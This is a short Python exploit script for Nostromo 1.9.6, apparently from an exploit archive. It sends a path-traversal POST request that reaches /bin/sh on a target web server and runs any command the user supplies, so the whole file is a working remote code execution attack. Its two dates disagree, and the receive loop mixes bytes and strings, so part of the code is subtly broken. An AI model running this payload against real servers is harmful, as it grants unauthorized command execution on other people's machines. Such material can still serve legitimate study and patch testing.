#!/usr/bin/env python3

# Date: 2019-12-31
# Exploit Author: redxe

import argparse
import socket

parser = argparse.ArgumentParser(description="Nostromo 1.9.6 - Remote Code Execution Tool")
parser.add_argument('ip_address', type=str)
parser.add_argument('port', type=int)
parser.add_argument('command', nargs=argparse.REMAINDER)

title = """
█▄░█ █▀█ █▀ ▀█▀ █▀█ █▀█ █▀▄▀█ █▀█ █░█ █▀  redxe
█░▀█ █▄█ ▄█ ░█░ █▀▄ █▄█ █░▀░█ █▄█ █▄█ ▄█  30-05-2020
"""


def connect(sock:socket.socket) -> str:
    response: str = ""
    try:
        while True:
            connection: bytes = sock.recv(1024)
            if len(connection) == 0:
                break
            response += connection
    except:
        pass
    return response


def nostromous(target: str, port: int, command: str):
    sock: socket.socket = socket.socket()
    print("[!] CONNECTING TO {0} ON PORT {1}".format(target, port))
    sock.connect((target, port))
    payload: str = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: ' \
                   '1\r\n\r\necho\necho\n{} 2>&1'.format(command)
    print("[!] EXECUTING PAYLOAD")
    print("[*] {0}".format(payload.encode()))
    sock.send(payload.encode())
    print("\n[!] OPEN FOR RESPONSE")
    response: str = connect(sock)
    print('[@] {0}'.format(response) if response else '[@] NO DATA RECEIVED')


if __name__ == '__main__':
    print(title)
    args = parser.parse_args()
    if not args.command:
        print("Error: no command specified.")
    else:
        nostromous(args.ip_address, args.port, " ".join(args.command))
        #print('{0.ip_address} {0.port} {0.command}'.format(args))
